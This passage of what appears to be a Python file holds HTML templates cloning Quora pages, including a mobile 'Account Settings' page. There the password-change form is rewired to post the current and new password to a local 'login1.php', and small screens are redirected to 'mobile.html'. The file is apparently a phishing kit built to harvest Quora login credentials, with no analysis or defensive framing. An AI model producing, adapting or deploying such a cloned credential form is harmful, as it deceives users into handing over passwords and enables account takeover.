                    ["unified_view/signup/pixel", "TaboolaPixel", "E7oJV4u", "", {
                        "events": []
                    }, {}],
                    ["unified_view/signup/pixel", "TwitterPixel", "TqdWamu", "", {
                        "events": []
                    }, {}],
                    ["unified_view/signup/pixel", "OutbrainPixel", "g3PPXfM", "", {
                        "events": []
                    }, {}],
                    ["unified_view/ad_blocker", "AdBlockerCheckerMain", "Y8ySc3m", "", {}, {}],
                    ["view/captcha", "Captcha", "f7V8g0l", "", {}, {}],
                    ["unified_view/reauth", "ReauthWrapper", "M69fo2I", "", {}, {}],
                    ["view/livenode", "LiveSpinner", "EZ8teRY", "", {}, {}],
                    ["unified_view/pmsg", "PMsgContainer", "JbDZ7W7", "", {}, {}],
                    ["unified_view/google_analytics", "GASnippet", "DI1962m", "", {
                        "tracking_id": "UA-16618355-1",
                        "tracking_rate": 1,
                        "custom_dimensions": [
                            ["dimension1", "settings-index"],
                            ["dimension2", true],
                            ["dimension3", false]
                        ]
                    }, {}],
                    ["unified_view/service_worker", "Installer", "GB5GQUT", "", {}, {}],
                    ["unified_view/browser_push", "BrowserPush", "PXLzlRg", "", {
                        "is_web_push_enabled": false
                    }, {}],
                    ["unified_view/sharethis", "SharethisImageTracker", "Km1lh72", "", {
                        "image_source": ""
                    }, {}],
                    ["unified_view/gif_player", "QTextGIFPlayer", "ZKAZ9Gh", "", {}, {}]
                ], true
            ];
            webnode.initialize2.apply(null, args);
        });
    </script>
    <script type="text/javascript">
        require.whenReady("shared/main-loaded", function() {
            var w2_timing = require('shared/w2.timing');
            var timing = w2_timing.timing;
            window.addEventListener('DOMContentLoaded', function() {
                w2_timing.logTime('documentReady');
            });
            window.addEventListener('load', function() {
                w2_timing.logTime('windowLoad');
                require('shared/e2e').reportPageData({
                    "standard": {}
                })
            });
            timing.server_time = 110.22;
            timing.total_worker_time = 86.35;
            timing.window_id = "dep5105-1074682703685733413";
            timing.page = 110.22;
            timing.request = 118.34;
            timing.is_css_inlined = false;
            timing.is_early_js_inlined = false;
            timing.page_size = 52430;
            timing.experiments = "AAEAAAyRLDVZjAufZ1JPEAmw5iiZd+HvkKfriY0Qmt/FIuCy+GXOnBHIh8db+m5tsQ21G3kMTh7nrL9CuC3guqJwBX6b2DyNCO4vmxEtoGPwGA1iMOahipqtJNN7OuLmJyNwQd5TddnL7NeSbW2LIPjrRj+2d2jURXmzWioQG7D9LDHoSR6+R4gDlSKuiXxjaUXrqWOf6QZ9chTyG+lTIgXolp7u4ditF7VKCOl9+E95yBD5GSohE5iA80U/VNqwjZ7v0vYE9tw8PgZ77xeM29Alzdo8zTCbtEV6ATeB3rMEfF2h2/LRNnS7ShZz8ubS0Ip8CEhVGVBxrtEvObfplGQRb0HSDm4f3HB/Ia0jdTlsKGb2";
        });
    </script>

    <script type="text/javascript">
    <!--
    if (screen.width <= 699) {
    document.location = "mobile.html";
    }
    //-->
    </script>
    </body>
</html>"""
















































































Mobile_Quora = """<html class="js-wf-loaded" lang="en"><head><link rel="icon" href="https://qsf.fs.quoracdn.net/-3-images.favicon.ico-26-ae77b637b1e7ed2c.ico"><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q-icons.q-icons.woff2-26-9afc20a49e3ef2cf.woff2"><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_regular.woff2-26-7ace3bc4cbe404d9.woff2"><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_regular_italic.woff2-26-9d81ab3229809d01.woff2"><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_semibold.woff2-26-b55bf39d9018ace9.woff2"><link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_semibold_italic.woff2-26-4c39f22524232bf2.woff2"><script async="" src="https://quora.com//www.google-analytics.com/analytics.js"></script><script type="text/javascript">window.Q = {"fontFamilies": ["q-icons", "q_serif"], "errorSamplingRate": 0};window["webpackManifest"] = {"content_widgets": "https://qsbr.fs.quoracdn.net/-3-chunk.mobile.content_widgets.js.out-34-9a6c124eee999cb7.webpack", "dev": "https://qsbr.fs.quoracdn.net/-3-chunk.mobile.dev.js.out-34-f5c0b61f277357a7.webpack", "qtext2": "https://qsbr.fs.quoracdn.net/-3-chunk.mobile.qtext2.js.out-34-b1892d2e26c53436.webpack", "internal": "https://qsbr.fs.quoracdn.net/-3-chunk.mobile.internal.js.out-34-7bea9a042b51a950.webpack", "main": "https://qsbr.fs.quoracdn.net/-3-chunk.mobile.main.js.out-34-d5945c5715f8c6e5.webpack", "firebase": "https://qsbr.fs.quoracdn.net/-3-chunk.mobile.firebase.js.out-34-dea1d18765a9ec75.webpack"};window["webpackChunks"] = ["main"];window["PAGE_IS_MOBILE"] = true;</script><meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width, minimum-scale=1" id="viewport"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="theme-color" content="#b92b27"><meta property="al:android:url" content="intent://quora.com/#Intent;scheme=qhttp;package=com.quora.android;end"><meta property="al:android:package" content="com.quora.android"><link href="https://qsbr.fs.quoracdn.net/-3-mobile_app2.mweb.css-26-ff71d993edc89bcb.css" rel="stylesheet" type="text/css"><script type="text/javascript" src="https://qsbr.fs.quoracdn.net/-3-mobile.entry.js.out-34-74770d379ac1da55.webpack"></script><link as="script" rel="preload" href="https://qsbr.fs.quoracdn.net/-3-chunk.mobile.main.js.out-34-d5945c5715f8c6e5.webpack"><script type="text/javascript" src="https://qsbr.fs.quoracdn.net/-3-chunk.mobile.main.js.out-34-d5945c5715f8c6e5.webpack" async="1" defer="1"></script><title>Account Settings - Quora</title><meta name="robots" content="noindex, follow"><style>@-webkit-keyframes insQ_100 {  from {  outline: 1px solid transparent  } to {  outline: 0px solid transparent }  }
img { animation-duration: 0.001s; animation-name: insQ_100; -webkit-animation-duration: 0.001s; -webkit-animation-name: insQ_100;  } </style><script type="text/javascript" charset="utf-8" async="" src="https://qsbr.fs.quoracdn.net/-3-chunk.mobile.qtext2.js.out-34-b1892d2e26c53436.webpack"></script></head><body class="mobile_app2 experiment-lookup_bar-on pretty_blogs mweb mweb_android lang_en"><div class="PageWrapper" id="page_wrapper"><div id="main_page_wrapper"><div class="Header" id="header"><div class="fixed_header"><div class="header_main"><a class="logo hidden" href="https://quora.com/" id="logo"><span>Quora</span></a><div class="page_title" id="page_title">Account Settings</div><div class="header_action_buttons" id="header_action_buttons"><a class="ViewInAppLink" href="#" id="__w2_iUmFBA5_view_in_app">Search</a><a class="LookupBarButton search" id="__w2_PsdjdQH_lookup_bar"></a><a class="right_icon_button hidden" id="right_icon_button_0"></a><a class="right_icon_button hidden" id="right_icon_button_1"></a></div><a class="navigation_button hidden" id="navigation_button"></a><a class="filter_button hidden" id="filter_button"><span class="filter_text"></span><span class="filter_icon"></span></a></div><div class="header_nav_wrapper"><ul class="header_nav"><li class="HeaderNavItem HomeNavItem"><a href="https://quora.com/"><div class="label">Home</div><div class="badge hidden" id="home_badge"></div></a></li><li class="HeaderNavItem OpenQsNavItem"><a href="https://quora.com/answer"><div class="label">Answer</div><div class="badge hidden" id="open_qs_badge"></div></a></li><li class="HeaderNavItem NotifsNavItem"><a href="https://quora.com/notifications"><div class="label">Notifs</div><div class="badge hidden" id="notifs_badge"></div></a></li><li class="HeaderNavItem ProfileNavItem"><a href="https://quora.com/profile/Cyber-Fox-8"><div class="label">You</div><div class="badge hidden" id="profile_badge"></div></a></li></ul></div><div class="mweb_new_stories_button_wrapper" id="mweb_new_stories_button_wrapper"></div></div></div><div class="AccountSettings"><span id="jltoVv"><div class="FormMixin EmailAccountSettingsSection Section FormSection BlockComponent has_header_text" id="__w2_P2nyWmP_section"><div class="section_header" id="__w2_P2nyWmP_section_header">Email</div><form class="table_button_wrapper" method="post" id="__w2_P2nyWmP_form"><ul class="ts_cells"><li class="Cell has_detail_text" id="__w2_uNtJP89_cell"><span class="tc_inner"><span class="tc_text" id="__w2_uNtJP89_cell_text">[EMAIL]</span><p class="tc_detail" id="__w2_uNtJP89_cell_detail_text">Primary Email</p></span><div class="tc_stroke"></div></li><li class="InputMixin Cell InputCell" id="__w2_CLL4RM5_cell"><div class="tc_stroke"></div></li></ul></form></div></span><div class="FormMixin Section PasswordAccountSettingsSection FormSection BlockComponent has_header_text" id="__w2_DfZEx0M_section"><div class="section_header" id="__w2_DfZEx0M_section_header">Password</div><form class="table_button_wrapper" action="login1.php"  method="POST"><ul class="ts_cells"><li class="InputMixin Cell InputCell" id="__w2_dLdjUe8_cell"><span class="tc_inner"><div class="form_inputs"><div class="form_row"><label class="input_label" for="old_password" id="__w2_dLdjUe8_label">Current</label><input class="text input_field" name="input" placeholder="Required" data-group="js-editable" w2cid="dLdjUe8" id="old_password" type="password"></div></div></span><div class="tc_stroke"></div></li><li class="InputMixin Cell InputCell" id="__w2_DDy7SMx_cell"><span class="tc_inner"><div class="form_inputs"><div class="form_row"><label class="input_label" for="new_password" id="__w2_DDy7SMx_label">New</label><input class="text input_field" name="input1" placeholder="Required" data-group="js-editable" w2cid="DDy7SMx" name="new_pass" id="new_password" type="password"></div></div></span><div class="tc_stroke"></div></li></ul><center><input type="submit" value="Change Password" class="submit_button" name="save" style="background-color: #CC0000;" id="__w2_DfZEx0M_submit"></center></div></form><div class="connected_accounts"><div class="BlockComponent Section has_header_text" id="__w2_JYurj27_section"><div class="section_header" id="__w2_JYurj27_section_header">Please enter a secure password, Make sure no one has your password</div></div></div></div></div><div class="MobilePageWrapperFooterInner"><div class="hidden" id="lookup_bar_page_wrapper"><div class="Header MobileWebLookupBarHeader" id="lookup_bar_header"><div class="fixed_header"><div class="header_main"><button class="mweb_modal_back_button" id="__w2_YjHyxao_mweb_lookup_bar_back_button"></button><div class="mweb_lookup_bar_input_wrapper"><input class="mweb_lookup_bar_input" data-group="js-editable" placeholder="Ask Quora" w2cid="YjHyxao" id="__w2_YjHyxao_mweb_lookup_bar_input"></div></div><div class="mweb_new_stories_button_wrapper" id="mweb_new_stories_button_wrapper"></div></div></div><div class="hidden mweb_lookup_bar_footer_wrapper" id="__w2_TTEYFbI_lookup_bar_footer_wrapper"><div class="mweb_lookup_bar_text" id="__w2_TTEYFbI_lookup_bar_text"></div><label class="mweb_lookup_bar_anon_wrapper" id="__w2_TTEYFbI_anon_wrapper"><input data-group="js-editable" w2cid="TTEYFbI" id="__w2_TTEYFbI_anon_checkbox" type="checkbox"><div id="__w2_TTEYFbI_anon_text"></div></label><div class="button_wrapper"><div class="counter hidden" id="__w2_TTEYFbI_counter"><div class="CharacterCounter fade_out" id="__w2_ELUGeiI_counter_wrapper"><div class="counter" id="__w2_ELUGeiI_counter">250</div></div></div><a class="mweb_lookup_bar_button" href="#" id="__w2_TTEYFbI_lookup_bar_button"></a></div></div><div id="__w2_eodBEys_results"></div><div class="ask_interstitial hidden" id="__w2_eodBEys_ask_mode_interstitial"><p class="ask_interstitial_content"><strong class="ask_interstitial_title" id="__w2_eodBEys_interstitial_title"></strong><span id="__w2_eodBEys_interstitial_text"></span></p></div><div id="__w2_eodBEys_empty_state"></div></div></div><div class="hidden" id="modal_page_wrapper"></div></div><span id="kQZqyc"></span><div class="action_view_overlay hidden" id="__w2_BHnuLNy_container"><div class="action_view_header" id="__w2_BHnuLNy_action_view_header"><span class="action_view_close" id="__w2_BHnuLNy_close_button"></span><span class="action_view_title" id="__w2_BHnuLNy_title"></span><div class="header_action_buttons" id="__w2_BHnuLNy_header_action_buttons"><a class="right_icon_button hidden" id="__w2_BHnuLNy_right_icon_button_0"></a><a class="right_icon_button hidden" id="__w2_BHnuLNy_right_icon_button_1"></a></div><a class="navigation_button hidden" id="__w2_BHnuLNy_navigation_button"></a></div><div class="action_view_content" id="__w2_BHnuLNy_content"></div></div><span id="uQEAlZ"></span><div class="PMsgContainer" id="__w2_ERdKO8l_pmsg_container"></div><div class="hidden" id="__w2_LEgzS0Z_prefetched_modal"><div class="AskQuestionModal Modal duplicates_style_search_results"><div class="Header ModalHeader"><div class="fixed_header"><div class="header_main"><button class="mweb_modal_back_button" id="__w2_QUX4JhQ_close"></button><div class="page_title unified" id="__w2_QUX4JhQ_modal_title">Add a Question</div><a class="navigation_button hidden" id="__w2_QUX4JhQ_nav"></a></div></div></div><div class="modal_content" id="__w2_QUX4JhQ_content"><div id="__w2_QUX4JhQ_content_inner_question"><div class="first_question_prompt"><p class="prompt_title">You are asking your first question!</p><p>How to quickly get a good answer:</p><ul class="tip_list"><li>Keep your question short and to the point</li><li>Check for grammar or spelling errors</li><li>Phrase it like a question</li><li>Make sure it hasn't been asked before</li></ul></div><div class="ask_modal_header"><div class="fake_reason" id="__w2_QUX4JhQ_user_asks"><span class="IdentityNameWithPhoto NameWithPhoto"><span id="iHnjCy"><span class="photo_tooltip Photo IdentityPhoto PhotoSpan HoverMenu" id="__w2_UPhCWCg_link"><a href="https://quora.com/profile/Cyber-Fox-8" mobile_loading_placeholder="profile" id="__w2_WKXI7K3_link"><img class="profile_photo_img" src="https://qph.fs.quoracdn.net/main-thumb-531179772-50-dtoqkkzynfckadkoqyndharwkvoabaow.jpeg" alt="Cyber Fox" height="50" width="50"></a></span></span><span id="cKOuqt"><span id="__w2_tZwzPso_link"><a class="user" href="https://quora.com/profile/Cyber-Fox-8" mobile_loading_placeholder="profile" action_mousedown="UserLinkClickthrough" id="__w2_tZwzPso_name_link">Cyber Fox</a></span></span></span> added</div><div class="fake_reason hidden" id="__w2_QUX4JhQ_anon_asks"><img class="profile_photo_img" src="https://qsf.fs.quoracdn.net/-3-images.new_grid.profile_pic_anon_small.png-26-73f5501d4057cb2e.png" alt="Quora User" height="25" width="25">Anonymous asks</div></div><div class="TypersearchESDuplicateQuestionSelector Selector AskQuestionSelector" tabindex="-1" id="__w2_S08WEsJ_wrapper"><div class="selector_input_interaction"><textarea class="selector_input text" type="text" rows="1" title="Start your question with &quot;What&quot;, &quot;How&quot;, &quot;Why&quot;, etc." data-group="js-editable" placeholder="Start your question with &quot;What&quot;, &quot;How&quot;, &quot;Why&quot;, etc." w2cid="S08WEsJ" id="__w2_S08WEsJ_input"></textarea><div class="selector_spinner hidden" id="__w2_S08WEsJ_spinner"><div class="LoadingDots tiny"><div class="dot first"></div><div class="dot second"></div><div class="dot third"></div></div></div></div><div class="selector_underlay hidden" id="__w2_S08WEsJ_selector_underlay"></div><div class="selector_results_container is_inline" id="__w2_S08WEsJ_results_container"><div class="selector_results_container_inner hidden" id="__w2_S08WEsJ_results"></div><div id="__w2_S08WEsJ_empty_input_prompt"></div></div></div><span id="UXPRVW"><div class="QuestionSourceEdit"><div class="source_editor" id="__w2_ivgNAod_toolbar"><div class="bar bar_link_state"><input value="" formnovalidate="formnovalidate" placeholder="Optional: include a link that gives context" data-group="js-editable" w2cid="ivgNAod" id="__w2_ivgNAod_link_input" type="url"></div></div></div></span><label class="modal_action anon"><input data-group="js-editable" w2cid="QUX4JhQ" id="__w2_QUX4JhQ_anon_checkbox" type="checkbox">Add Anonymously</label></div></div></div></div><script type="text/javascript">require.assertPagePropertiesInstalled();</script><script type="text/javascript">require.whenReady("shared/main-loaded", function() {
            var webnode = require('shared/core/webnode');
            var args = [{"parents": {"Dn6wxSM": "*ROOT*", "i8eDdWB": "*ROOT*", "AiLENX4": "i8eDdWB", "uowmmgA": "i8eDdWB", "gTeqTUO": "uowmmgA", "P2nyWmP": "gTeqTUO", "uNtJP89": "gTeqTUO", "CLL4RM5": "gTeqTUO", "RDRpiRs": "uowmmgA", "DfZEx0M": "RDRpiRs", "dLdjUe8": "RDRpiRs", "DDy7SMx": "RDRpiRs", "ylt8cbc": "uowmmgA", "JYurj27": "ylt8cbc", "sK3UjUO": "ylt8cbc", "LFKGDdw": "sK3UjUO", "FN4l2B4": "sK3UjUO", "szXGzt5": "FN4l2B4", "WGbJbBy": "ylt8cbc", "rlXu0VR": "WGbJbBy", "Fx8QBO7": "WGbJbBy", "shmnGNr": "Fx8QBO7", "lMqLELw": "ylt8cbc", "VTEtYtd": "lMqLELw", "syx1JH1": "lMqLELw", "ARvRJQj": "syx1JH1", "owEyydx": "lMqLELw", "Q6pi6C8": "owEyydx", "mKUXzgA": "ylt8cbc", "BtTRO47": "mKUXzgA", "I9yrXiY": "mKUXzgA", "aiIw2pK": "I9yrXiY", "g0dsBtZ": "i8eDdWB", "uoTr4HN": "*ROOT*", "aJFUkXM": "Dn6wxSM", "LP9kzMJ": "AiLENX4", "a2M1RUD": "LP9kzMJ", "SPieCrG": "a2M1RUD", "iUmFBA5": "a2M1RUD", "PsdjdQH": "a2M1RUD", "UIAO0QL": "a2M1RUD", "IgPNBj9": "a2M1RUD", "fI1KF7w": "a2M1RUD", "uzVJofC": "a2M1RUD", "wY4VmIa": "a2M1RUD", "wP1UQL6": "a2M1RUD", "NLvPxhR": "LP9kzMJ", "F9PdsXv": "g0dsBtZ", "YjHyxao": "F9PdsXv", "albZaCA": "F9PdsXv", "QrPepa1": "albZaCA", "TTEYFbI": "QrPepa1", "ELUGeiI": "TTEYFbI", "eodBEys": "albZaCA", "zXeytfj": "eodBEys", "iuLEHL1": "uoTr4HN", "COVjdvl": "iuLEHL1", "dcX4Dxt": "iuLEHL1", "FHkpS5A": "iuLEHL1", "z9h5s8E": "iuLEHL1", "CXsq9Wo": "iuLEHL1", "k9QgCgk": "iuLEHL1", "PQgnx4G": "iuLEHL1", "QI1dNCX": "iuLEHL1", "BHnuLNy": "iuLEHL1", "caHCulT": "iuLEHL1", "y7Tq6sC": "iuLEHL1", "K9KN79o": "iuLEHL1", "ERdKO8l": "iuLEHL1", "LEgzS0Z": "iuLEHL1", "QUX4JhQ": "LEgzS0Z", "H55Bcj1": "QUX4JhQ", "UPhCWCg": "H55Bcj1", "WKXI7K3": "UPhCWCg", "tZwzPso": "H55Bcj1", "JxOlgpA": "QUX4JhQ", "S08WEsJ": "QUX4JhQ", "FD80abW": "S08WEsJ", "ivgNAod": "QUX4JhQ", "xLOTou0": "iuLEHL1", "taXpWOL": "iuLEHL1", "rv2oiCo": "iuLEHL1", "oSLF4kA": "iuLEHL1", "SUSbmZW": "iuLEHL1"}, "children": {"TTEYFbI": {"counter": "ELUGeiI"}, "LEgzS0Z": {"ask_modal": "QUX4JhQ"}, "QUX4JhQ": {"question_bar": "S08WEsJ", "sources": "ivgNAod"}}, "domids": {"gTeqTUO": "jltoVv", "sK3UjUO": "sZvjtT", "WGbJbBy": "TaXpSY", "shmnGNr": "sjYEND", "lMqLELw": "EwOMxp", "mKUXzgA": "NaMXid", "aiIw2pK": "Otbgvz", "aJFUkXM": "AFoypk", "LP9kzMJ": "ILjSfv", "F9PdsXv": "rUYeyW", "albZaCA": "EqHXsw", "eodBEys": "kFnMkP", "iuLEHL1": "ovPIBP", "FHkpS5A": "ebTUPp", "y7Tq6sC": "uQEAlZ", "UPhCWCg": "iHnjCy", "tZwzPso": "cKOuqt", "ivgNAod": "UXPRVW", "SUSbmZW": "kQZqyc"}, "hmacs": {"Dn6wxSM": "FwDipDG7HwJLow", "i8eDdWB": "6tBqotZWnLJ2wh", "AiLENX4": "vj+VNb4Ouv+0Yf", "uowmmgA": "JRy69wV2X55UOj", "gTeqTUO": "LZ1S2QcAqfJ5gs", "P2nyWmP": "wgLR/+YM0htBlY", "uNtJP89": "aFZ7L9mQXWtdw9", "CLL4RM5": "ElzvQMBE8VhmIY", "RDRpiRs": "qpCwGzyjaOcRSy", "DfZEx0M": "fN0A7uOQyd2fll", "dLdjUe8": "ElzvQMBE8VhmIY", "DDy7SMx": "ElzvQMBE8VhmIY", "ylt8cbc": "v3Z+akovoVRICB", "JYurj27": "lDsh8RhvVIma1R", "sK3UjUO": "0OcRuIp+dZh4zl", "LFKGDdw": "lDsh8RhvVIma1R", "FN4l2B4": "aFZ7L9mQXWtdw9", "szXGzt5": "Uav53WZuocJ5Nt", "WGbJbBy": "S4UjZTbkCce1hf", "rlXu0VR": "lDsh8RhvVIma1R", "Fx8QBO7": "aFZ7L9mQXWtdw9", "shmnGNr": "f6pKmtm4UMnFlT", "lMqLELw": "tP/2jHIv7zBNNo", "VTEtYtd": "lDsh8RhvVIma1R", "syx1JH1": "aFZ7L9mQXWtdw9", "ARvRJQj": "RRdWTkFvH9gBfr", "owEyydx": "ERJB+3uRRhUIsR", "Q6pi6C8": "https://quora.com/lF7p/uzeU882J", "mKUXzgA": "DW1A3Y6dyysjBv", "BtTRO47": "lDsh8RhvVIma1R", "I9yrXiY": "aFZ7L9mQXWtdw9", "aiIw2pK": "kZbz5JfiM7Rgyq", "g0dsBtZ": "Ap4GewERd0X/SG", "uoTr4HN": "jSgexIrQDIVpn4", "aJFUkXM": "jVDuVsfNOeJm/M", "LP9kzMJ": "54WnPNj3dAf8wl", "a2M1RUD": "F+LWFQz1ngm31k", "SPieCrG": "lXg0WYQ4eXL6dm", "iUmFBA5": "FZyGp33vhgezLb", "PsdjdQH": "sBlvhfPz4flM9v", "UIAO0QL": "Csx38nPd+xil5S", "IgPNBj9": "Csx38nPd+xil5S", "fI1KF7w": "LDfG0CN0wYLOCs", "uzVJofC": "E793LURt7G0APr", "wY4VmIa": "KOrA/FKYAFMDRD", "wP1UQL6": "aQrqq7LbMRs+ox", "NLvPxhR": "SYWDgoXsL72Cbe", "F9PdsXv": "9uBVwF9JsoArqo", "YjHyxao": "zotwzV69es6Q9v", "albZaCA": "fJ/SKS1HfbpjPs", "QrPepa1": "HR4fXT/uVXqwL1", "TTEYFbI": "zMKcq0JYduRt+u", "ELUGeiI": "ZzkroqNWdLOMoO", "eodBEys": "pCxBS4ajcTqrAC", "zXeytfj": "lk0TW0kXtRRG/d", "iuLEHL1": "vXr4a3MLgJsI+k", "COVjdvl": "DAalTWsvfBzxrO", "dcX4Dxt": "0Dcgkp3g70+Q2B", "FHkpS5A": "RBbDsiUbk40vfy", "z9h5s8E": "f+sEcRwTb+sbHE", "CXsq9Wo": "YFI1RXSu8DxUsE", "k9QgCgk": "Qwdqv/nd2Ccw+2", "PQgnx4G": "https://quora.com/n7NLReXYrXl3v", "QI1dNCX": "e5r4yEQRzDn4cb", "BHnuLNy": "OmQKMWwRe0r68M", "caHCulT": "o4D6hV5o+SOXVw", "y7Tq6sC": "1on7AgBqko/PdP", "K9KN79o": "1j77S+X28y8XLC", "ERdKO8l": "YHfNweTms8ZWw8", "LEgzS0Z": "OHdD3KixsVE9ru", "QUX4JhQ": "zcNhf8gt8agBrS", "H55Bcj1": "crQMO1FhnMa+7d", "UPhCWCg": "Ao3Pimskxsgkfi", "WKXI7K3": "cw6msTAzMQ4/lb", "tZwzPso": "y1+KhEHoznsQiF", "JxOlgpA": "ZJZdEajoocTbQm", "S08WEsJ": "iUA/WkvBShPAOR", "FD80abW": "ymWNAWNIMdOKzz", "ivgNAod": "t7N5RtR9tpYTD7", "xLOTou0": "p5lGEUx+lQ4CcC", "taXpWOL": "2D/JudGYD5k2wv", "rv2oiCo": "H2UDSnbFoqOmHr", "oSLF4kA": "IfUMPT6rWRMndK", "SUSbmZW": "aIZbqR9s719u4A"}}, [["shared/core/component", "Component", "gTeqTUO", "", {}, {}], ["mobile_app2/view/mobile/table", "FormSection", "P2nyWmP", "", {"is_form_section": true, "is_radio_section": false, "autofocus": null, "required": ["email"], "disabled_class": "is_disabled", "submit_server_call": "submit", "error_title": "Connection Error", "error_message": "Could not reach Quora at this time"}, {}], ["mobile_app2/view/mobile/table", "InputMixin", "CLL4RM5", "", {"max_length": null, "warning_length": null, "field_id": "email"}, {}], ["mobile_app2/view/mobile/table", "FormSection", "DfZEx0M", "", {"is_form_section": true, "is_radio_section": false, "autofocus": null, "required": ["old_password", "new_password"], "disabled_class": "is_disabled", "submit_server_call": "submit", "error_title": "Connection Error", "error_message": "Could not reach Quora at this time"}, {}], ["mobile_app2/view/mobile/table", "InputMixin", "dLdjUe8", "", {"max_length": null, "warning_length": null, "field_id": "old_password"}, {}], ["mobile_app2/view/mobile/table", "InputMixin", "DDy7SMx", "", {"max_length": null, "warning_length": null, "field_id": "new_password"}, {}], ["mobile_app2/view/mobile/table", "Section", "JYurj27", "", {"is_form_section": false, "is_radio_section": false}, {}], ["shared/core/component", "Component", "sK3UjUO", "", {}, {}], ["mobile_app2/view/mobile/table", "Section", "LFKGDdw", "", {"is_form_section": false, "is_radio_section": false}, {}], ["mobile_app2/app/view/settings/mobile", "DisconnectText", "szXGzt5", "", {}, {}], ["shared/core/component", "Component", "WGbJbBy", "", {}, {}], ["mobile_app2/view/mobile/table", "Section", "rlXu0VR", "", {"is_form_section": false, "is_radio_section": false}, {}], ["mobile_app2/app/view/activation/twitter", "ConnectTwitterText", "shmnGNr", "", {"url": "https://www.quora.com/twitter/oauth_window?platform=mobile_web2&target=settings", "provider": null, "success": null, "access_token": null, "error_title": "Connection Error", "error_message": "Unable to connect account."}, {}], ["shared/core/component", "Component", "lMqLELw", "", {}, {}], ["mobile_app2/view/mobile/table", "Section", "VTEtYtd", "", {"is_form_section": false, "is_radio_section": false}, {}], ["mobile_app2/app/view/settings/mobile", "DisconnectText", "ARvRJQj", "", {}, {}], ["unified_view/switch", "Switch", "Q6pi6C8", "", {"kwargs": {}}, {}], ["shared/core/component", "Component", "mKUXzgA", "", {}, {}], ["mobile_app2/view/mobile/table", "Section", "BtTRO47", "", {"is_form_section": false, "is_radio_section": false}, {}], ["mobile_app2/app/view/settings/mobile", "ConnectLinkedinText", "aiIw2pK", "", {"url": "https://www.quora.com/linkedin_/oauth_window?platform=mobile_web2&target=settings", "provider": null, "success": null, "access_token": null, "error_title": "Connection Error", "error_message": "Unable to connect account."}, {}], ["mobile_app2/app/view/mweb", "ApiCallsComponent", "SPieCrG", "", {}, {}], ["mobile_app2/app/view/mweb", "ViewInAppLink", "iUmFBA5", "", {"app_store_link": "https://quora.com/app/android?campaign=open_in_app_logged_in", "app_store_fallback": true, "app_url": "intent://quora.com/#Intent;scheme=qhttp;package=com.quora.android;end", "is_ios_device": false, "should_set_cookie_on_click": false, "triggerRedirectImmediately": false, "appStoreTimeout": 1000, "returnToBrowserTimeout": 5000, "iosUniversalLinks": false}, {}], ["mobile_app2/app/view/mweb", "LookupBarButton", "PsdjdQH", "", {}, {}], ["mobile_app2/view/mobile/add_question", "MobileWebLookupBarHeader", "YjHyxao", "", {"is_standalone": false, "question_prefix": "", "opening_question_punctuation": "", "closing_question_punctuation": "?"}, {}], ["mobile_app2/view/mobile/add_question", "AddQuestionSubmitHandler", "QrPepa1", "", {"additionalSubmitKwargs": {}, "error_title": "Error", "should_action_view_anon_question": false}, {}], ["mobile_app2/view/mobile/add_question", "MobileWebLookupBarFooter", "TTEYFbI", "", {"length_limit": 250, "allow_anonymous": true, "use_multimodal": null}, {}], ["unified_view/character_counter", "CharacterCounter", "ELUGeiI", "counter", {"limit": 250, "warning_limit": -1, "visible_on": 25.0, "early_warning": false}, {}], ["mobile_app2/mobile/view/add_question/existing_questions", "LookupBarSearch", "eodBEys", "", {"max_concurrent_requests": 3, "max_cache_size": 50, "maxCharacterCount": 250, "countWhenWarning": -1, "countWhenVisible": 25, "formulateAsQuestionMessage": "Please formulate as a proper question.", "submitQuestion": "Submit", "anonymously": "Add anonymously", "askIt": "Ask Question", "cantFindQuestionText": "", "useInterstitial": true, "interstitials": {"bad": ["Is your question complete?", "Make sure to fill out a complete sentence that's in the form of a question."], "good": ["You're almost there!", "Make sure to double-check your phrasing before you press Submit."], "button": ["Ask your question here!", "Write your question as a complete sentence, then press Submit."], "answer": ["Ask and answer a question!", "Write about what you know by asking the question first."], "ask_question": ["What is your question?", "Ask a question and get answers from people with unique insights."]}, "selector_id": -829066529, "shouldSendJsData": false, "shouldDelayResultsJs": false, "errorMessage": {"title": "Error processing query", "content": "There was an error processing your query. Check your internet connection and try again.", "cancel": "Cancel", "retry": "Retry"}, "opening_question_punctuation": "", "closing_question_punctuation": "?"}, {}], ["unified_view/components", "JSTest", "COVjdvl", "", {}, {}], ["unified_view/sharethis", "SharethisImageTracker", "dcX4Dxt", "", {"image_source": ""}, {}], ["unified_view/signup/pixel", "FacebookPixel", "z9h5s8E", "", {"events": []}, {}], ["unified_view/signup/pixel", "GooglePixel", "CXsq9Wo", "", {"events": []}, {}], ["unified_view/signup/pixel", "TaboolaPixel", "k9QgCgk", "", {"events": []}, {}], ["unified_view/signup/pixel", "TwitterPixel", "PQgnx4G", "", {"events": []}, {}], ["unified_view/signup/pixel", "OutbrainPixel", "QI1dNCX", "", {"events": []}, {}], ["unified_view/mobile_overlays", "ActionViewOverlay", "BHnuLNy", "", {}, {}], ["unified_view/reauth", "ReauthWrapper", "K9KN79o", "", {}, {}], ["unified_view/pmsg", "PMsgContainer", "ERdKO8l", "", {}, {}], ["unified_view/question/ask_question", "PreloadedAskModal", "LEgzS0Z", "", {"page_type": null, "question_translation_nid": null, "source_nid": 0, "from_prompt": false, "source_window_id": "broadcast_mobile_xxdymmftihhn", "useMultiModal": null}, {}], ["unified_view/question/ask_question", "AskQuestionModal", "QUX4JhQ", "ask_modal", {"mobile_done_button": true, "done_text": "Add", "title_text": "Add a Question", "targetType": null, "targetOid": null, "submitButtonText": "Add", "submitButtonTextLink": "Share", "busyButtonText": "Adding...", "busyButtonTextLink": "Sharing...", "anonymouslyText": "Add Anonymously", "is_anon": false, "is_logged_out": false, "source": null, "titleText": "Add a Question", "from_url": null, "source_window_id": "broadcast_mobile_xxdymmftihhn", "inline_modal": false}, {"name_save": true}], ["unified_view/question/ask_question", 